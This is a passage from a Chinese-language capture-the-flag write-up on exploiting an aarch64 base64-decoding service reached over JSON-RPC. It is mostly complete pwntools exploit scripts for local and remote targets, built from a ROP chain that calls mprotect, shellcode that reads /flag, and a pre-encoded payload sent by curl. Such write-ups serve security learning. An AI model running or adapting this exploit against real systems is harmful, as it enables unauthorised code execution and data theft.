
result里没有flag的输出，是因为输出的格式是`{"output":"flag"}`，而上面的`0x4a2098`这里直接存放的是flag，所以需要在一个地址里构造一下`{"output": "`，然后再将flag放到后面，最后加上`"}``即可

### 最终本地exp如下

```python
from pwn import *
from os import system
import base64

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

context(arch='aarch64', os='linux', log_level='debug')

file_name = './base64'
r = process([file_name,'call','decode'])
def dbgg():
    raw_input()
elf = ELF(file_name)
dbgg()
shellcode = shellcraft.aarch64.linux.open("/flag",0)
shellcode += shellcraft.aarch64.linux.read(3,0x4a23a4,0x100)
shellcode += shellcraft.aarch64.linux.write(1,0x4a2398,0x100)
p1 = asm(shellcode)
p1 = p1.ljust(0x200, b'a')
p1 += p64(0) + p64(0x4A3000) + p64(0x4A0000)
p1 = p1.ljust(0x300, b'a')
p1 += b'{"output": "'
p1 = p1.ljust(0x350, b'a')
p1 += b'"}'
p1 = p1.ljust(0x418, b'a')
p1 += b'\x77\x77\x00\x00'
p1 += b'\x1d\x04\x00\x00'   #0x418 + 0x4 + 1
p1 += b'\x84\x05\x00\x00'   #
p1 += b'\x77\x07\x00\x00'
p1 += p64(0)

# 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
gadget1 = 0x000000000040064c
# 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget2 = 0x0000000000417920
# 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
gadget3 = 0x000000000040a95c
# 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret
gadget4 = 0x00000000004598c0
# 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret
gadget6 = 0x0000000000444e14
# 0x435338
gadget5 = 0x435338
'''
mov x1, x23
mov x0, x19
mov x2, x21
blr x20
'''
'''
.text:00000000004578A8 61 EE 41 F9                   LDR             X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9                   LDR             X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB                   SUB             X1, X1, X0
.text:00000000004578B4 80 00 00 8B                   ADD             X0, X4, X0
.text:00000000004578B8 A2 2E FF 97                   BL              sub_423340
'''
'''
.text:00000000004579A4 E2 00 80 52                   MOV             W2, #7
.text:00000000004579A8 FD 03 00 91                   MOV             X29, SP
.text:00000000004579AC 03 48 42 F9                   LDR             X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9                   LDR             X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9                   LDR             X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB                   SUB             X1, X1, X0
.text:00000000004579BC 60 00 00 8B                   ADD             X0, X3, X0
.text:00000000004579C0 60 2E FF 97                   BL              sub_423340
'''
magic_gadget = 0x00000000004579A4
# 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget7 = 0x0000000000400898
mprotect_addr = 0x423340
base64_decode_addr = 0x4a2098
#p1 += p64(0x00000000004579A4)
#p1 += p64(0x0000000000403ad8)
'''
p1 += p64(gadget4)
p1 += b'\x00' * 0x20
p1 += p64(0) + p64(gadget1)
p1 += p64(0) + p64(mprotect_addr)
p1 += b'\x00' * 0x30
p1 += p64(0) + p64(gadget2)
p1 += p64(0x4a2000) # x19
p1 += p64(0) * 2 + p64(gadget3)
p1 += p64(0) * 2 + p64(7) # x21
p1 += p64(0)
p1 += p64(0) + p64(base64_decode_addr)
p1 += p64(0) * 4  + p64(0x7000)
'''
p1 += p64(gadget7)
p1 += b'\x00' * 0x20
p1 += p64(0) + p64(magic_gadget)
p1 += p64(0) * 2 + p64(base64_decode_addr + 0x200 - 0x490)
p1 += p64(base64_decode_addr) * 5
p1 = base64.b64encode(p1)
ret = 0x406550
li(p1)
p2 = b'{"input":"' + p1 + b'"}'
li(p2)
r.sendline(p2)
r.interactive()
```

### 远程如下

```python
from pwn import *
from os import system

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

ip = 'df1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0V1&6z5e0W2Q4x3V1k6#2j5Y4g2K6i4K6t1%4'
p1 = '7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=='
shell = '''curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip
li(shell)
system(shell)
```

### 远程交互如下
